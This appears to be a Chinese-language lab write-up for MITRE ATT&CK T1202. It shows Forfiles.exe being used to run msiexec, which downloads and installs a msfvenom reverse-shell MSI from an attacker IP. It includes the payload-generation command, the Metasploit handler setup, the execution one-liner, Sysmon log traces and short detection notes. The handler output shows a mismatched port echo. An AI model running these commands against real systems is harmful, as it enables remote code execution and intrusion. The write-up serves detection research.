# T1202-win-间接命令执行-基于Forfiles执行payload(白名单)

## 来自ATT&CK的描述

可以使用各种Windows实用程序来执行命令，而不需要调用cmd。例如，Forfiles、程序兼容性助手（pcalua.exe）、WSL（WindowsSubsystem for Linux）组件以及其他实用程序可以从命令行界面、运行窗口或通过脚本来调用程序和命令的执行。

攻击者可能会滥用这些功能来规避防御，尤其是在破坏检测和/或缓解控制（如组策略）的同时执行任意动作。（这些控制限制/阻止了cmd或恶意负载相关文件扩展名的使用。）

## 测试案例

Forfiles为Windows默认安装的文件操作搜索工具之一，可根据日期，后缀名，修改日期为条件。常与批处理配合使用。

微软官方文档：

<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11)>

说明：Forfiles.exe所在路径已被系统添加PATH环境变量中，因此，Forfiles命令可识别，需注意x86，x64位的Forfiles调用。

Windows 2003 默认位置：

C:\WINDOWS\system32\forfiles.exe C:\WINDOWS\SysWOW64\forfiles.exe

Windows 7 默认位置：

C:\WINDOWS\system32\forfiles.exe C:\WINDOWS\SysWOW64\forfiles.exe

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7

### 攻击分析

#### 生成payload

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=8888 -f msi > abc.txt
```

#### MSF配置

```bash
msf5 exploit(multi/handler) > back
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 8888
lport => 5555
msf5 exploit(multi/handler) > exploit
```

#### 靶机执行payload

```cmd
forfiles /p c:\windows\system32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.126.146/abc.txt"
```

#### 反弹shell

反弹shell失败！！！但不影响后续分析

## 测试留痕

```log
#sysmon日志
EventID：1
Process Create:
RuleName:
UtcTime: 2020-04-18 16:27:08.447
ProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00}
ProcessId: 588
Image: C:\Windows\System32\msiexec.exe
FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows® installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: /q /i http://192.168.126.146/abc.txt
CurrentDirectory: C:\Windows\system32\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600}
LogonId: 0x66db8
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
ParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00}
ParentProcessId: 1220
ParentImage: C:\Windows\System32\forfiles.exe
ParentCommandLine: forfiles  /p c:\windows\system32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.126.146/abc.txt"


#win7安全日志
EventID：4688
进程信息:
新进程 ID: 0x4c4
新进程名: C:\Windows\System32\forfiles.exe
```

## 检测规则/思路

无具体检测。监控和分析基于主机的检测机制（如Sysmon）中的日志来查看事件，比如查看是否有进程创建事件（创建过程中使用了参数来调用程序/命令/文件和/或生成子进程/网络连接，或者该创建是由这些参数导致的）。

## 相关TIP
[[T1202-win-基于白名单Pcalua执行payload]]

## 参考推荐

MITRE-ATT&CK-T1202

<https://attack.mitre.org/techniques/T1202/>

基于白名单Forfiles执行payload

<https://www.bookstack.cn/read/Micro8/Chapter1-81-90-84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.md>
